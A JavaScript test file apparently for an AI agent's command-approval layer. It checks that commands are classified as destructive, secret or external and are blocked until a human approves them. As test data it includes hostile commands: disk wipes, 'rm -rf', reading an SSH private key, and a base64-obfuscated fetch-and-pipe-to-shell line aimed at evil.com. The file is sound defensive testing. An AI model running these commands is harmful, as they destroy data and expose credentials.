import assert from 'node:assert/strict';
import {
  classifyOperation,
  buildApprovalRequest,
  getApprovalPolicy,
  InMemoryApprovalStore,
} from '../dist/security/approval.js';

async function withEnv(name, value, fn) {
  const previous = process.env[name];
  if (value === undefined) delete process.env[name];
  else process.env[name] = value;
  try {
    await fn();
  } finally {
    if (previous === undefined) delete process.env[name];
    else process.env[name] = previous;
  }
}

async function testClassifyOperation() {
  // Destructive patterns
  for (const command of [
    'rm -rf /home/jacen/important',
    'sudo apt install foo',
    'chmod 777 /etc/passwd',
    'git push --force origin main',
    'dd if=/dev/zero of=/dev/sda',
    'mkfs.ext4 /dev/sdb1',
  ]) {
    const op = classifyOperation({ tool: 'start_process', args: { command } });
    assert.equal(op.commandClass, 'destructive', `expected destructive for: ${command}`);
  }

  // External / network binaries
  for (const command of ['curl https://example.com', 'wget http://example.com/f.bin', 'git clone https://github.com/x/y']) {
    const op = classifyOperation({ tool: 'start_process', args: { command } });
    assert.equal(op.commandClass, 'external', `expected external for: ${command}`);
  }

  // Secret reads
  const envRead = classifyOperation({ tool: 'start_process', args: { command: 'env' } });
  assert.equal(envRead.commandClass, 'secret', 'env read must classify as secret');
  const catKey = classifyOperation({ tool: 'start_process', args: { command: 'cat ~/.ssh/id_rsa' } });
  assert.equal(catKey.commandClass, 'secret', 'credential file read must classify as secret');

  // File writes outside workspace
  const write = classifyOperation({ tool: 'write_file', args: { path: '/home/jacen/other/x.txt', content: 'hi' } });
  assert.equal(write.commandClass, 'local-write');
  assert.deepEqual(write.paths, ['/home/jacen/other/x.txt']);

  // Read-only tools
  const read = classifyOperation({ tool: 'read_file', args: { path: '/home/jacen/proj/a.txt' } });
  assert.equal(read.commandClass, 'read-only');
  assert.equal(read.network, 'none');

  // Explicit network targets on a non-read tool + a command that matches a
  // network binary => external/restricted.
  const fetch = classifyOperation({ tool: 'start_process', args: { command: 'curl https://api.example.com', url: 'https://api.example.com' } });
  assert.equal(fetch.commandClass, 'external');
  assert.equal(fetch.network, 'restricted');
  assert.deepEqual(fetch.networkTargets, ['https://api.example.com']);
}

async function testUnmatchedCommandsFailClosed() {
  // Red-team fix #3: an unmatched terminal command has unknown side effects
  // and must classify as 'destructive' (fail-closed) by default.
  await withEnv('DC_UNMATCHED_COMMAND_POLICY', undefined, async () => {
    for (const command of [
      'python client.py',
      'find / -delete',
      'shred /home/jacen/notes.bin',
      'echo Y3VybCBldmlsLmNvbQ== | base64 -d | sh',
      'node -e "require(\'child_process\').exec(\'rm -rf ~\')"',
    ]) {
      const op = classifyOperation({ tool: 'start_process', args: { command } });
      assert.equal(op.commandClass, 'destructive', `unmatched command must fail closed: ${command}`);
    }
  });

  await withEnv('DC_UNMATCHED_COMMAND_POLICY', 'auto', () => {
    // Opt-in permissive behavior restores the old classification.
    const op = classifyOperation({ tool: 'start_process', args: { command: 'python client.py' } });
    assert.equal(op.commandClass, 'local-write', 'DC_UNMATCHED_COMMAND_POLICY=auto restores permissive classification');
  });
}

async function testApprovalReExecutionGate() {
  // Red-team fix #6: a denied request stays blocked; an approved request can
  // re-execute by presenting its approvalId in _meta.approvalId.
  const { preExecuteEnforcement, getApprovalStore } = await import('../dist/enforcement/pipeline.js');
  const args = { command: 'find /tmp/proj -name "*.log" -delete' };
  const meta = { agent: 'test-agent' };

  const first = await preExecuteEnforcement({ tool: 'start_process', args, meta });
  assert.equal(first.allowed, false, 'unapproved destructive command must be blocked');
  assert.equal(first.allowed === false && first.kind, 'approval-required');
  const approvalId = first.allowed === false && first.approvalRequest ? first.approvalRequest.approvalId : '';
  assert.ok(approvalId, 'block must carry an approval request');
  // The server layer submits the block's approval request into the store.
  const store = getApprovalStore();
  store.submit(first.approvalRequest);

  // Denied => still blocked.
  assert.equal(store.resolve(approvalId, 'denied'), true);
  const denied = await preExecuteEnforcement({ tool: 'start_process', args, meta: { ...meta, approvalId } });
  assert.equal(denied.allowed, false, 'a DENIED approval must not re-execute');

  // Approved => gate passes.
  const second = await preExecuteEnforcement({ tool: 'start_process', args, meta });
  const secondId = second.allowed === false && second.approvalRequest ? second.approvalRequest.approvalId : '';
  assert.ok(secondId, 'second block must carry a fresh approval request');
  store.submit(second.allowed === false && second.approvalRequest ? second.approvalRequest : { approvalId: '' });
  assert.equal(store.resolve(secondId, 'approved'), true);
  const approved = await preExecuteEnforcement({ tool: 'start_process', args, meta: { ...meta, approvalId: secondId } });
  assert.equal(approved.allowed, true, 'an APPROVED approval must let the exact request re-execute');

  // Mismatched command => blocked even with an approved id.
  const third = await preExecuteEnforcement({ tool: 'start_process', args, meta });
  const thirdId = third.allowed === false && third.approvalRequest ? third.approvalRequest.approvalId : '';
  store.submit(third.allowed === false && third.approvalRequest ? third.approvalRequest : { approvalId: '' });
  assert.equal(store.resolve(thirdId, 'approved'), true);
  const swapped = await preExecuteEnforcement({
    tool: 'start_process',
    args: { command: 'rm -rf /' },
    meta: { ...meta, approvalId: thirdId },
  });
  assert.equal(swapped.allowed, false, 'an approval for one command must not authorize a different command');
}

async function testPolicies() {
  assert.equal(getApprovalPolicy('read-only').mode, 'auto-approve');
  assert.equal(getApprovalPolicy('destructive').mode, 'require-approval');
  assert.equal(getApprovalPolicy('secret').mode, 'require-approval');
  assert.equal(getApprovalPolicy('external').mode, 'require-approval');

  await withEnv('DC_APPROVE_LOCAL_WRITES', undefined, () => {
    assert.equal(getApprovalPolicy('local-write').mode, 'auto-approve');
  });
  await withEnv('DC_APPROVE_LOCAL_WRITES', 'deny', () => {
    assert.equal(getApprovalPolicy('local-write').mode, 'require-approval');
  });
}

async function testApprovalRequestCarriesExactScope() {
  const op = classifyOperation({
    tool: 'start_process',
    args: { command: 'rm -rf /home/jacen/proj/build', path: '/home/jacen/proj/build' },
  });
  const request = buildApprovalRequest(op);
  assert.equal(request.command, 'rm -rf /home/jacen/proj/build');
  assert.deepEqual(request.resolvedPaths, ['/home/jacen/proj/build']);
  assert.equal(request.commandClass, 'destructive');
  assert.ok(request.approvalId.length > 0);
}

async function testApprovalStoreLifecycle() {
  const seen = [];
  const store = new InMemoryApprovalStore();
  store.onApprovalRequired = (request) => {
    seen.push(request.approvalId);
  };
  const request = buildApprovalRequest(classifyOperation({ tool: 'write_file', args: { path: '/tmp/a' } }));
  const id = store.submit(request);
  assert.deepEqual(seen, [id], 'onApprovalRequired hook must fire on submit');
  assert.equal(store.decision(id), 'pending');
  assert.equal(store.pending().length, 1);
  assert.equal(store.resolve(id, 'approved'), true);
  assert.equal(store.decision(id), 'approved');
  assert.equal(store.pending().length, 0);
  assert.equal(store.resolve(id, 'denied'), false, 'double resolution must fail');
  assert.equal(store.decision('missing-id'), undefined);
}

await testClassifyOperation();
await testUnmatchedCommandsFailClosed();
await testPolicies();
await testApprovalRequestCarriesExactScope();
await testApprovalStoreLifecycle();
await testApprovalReExecutionGate();
console.log('Approval policy tests passed.');
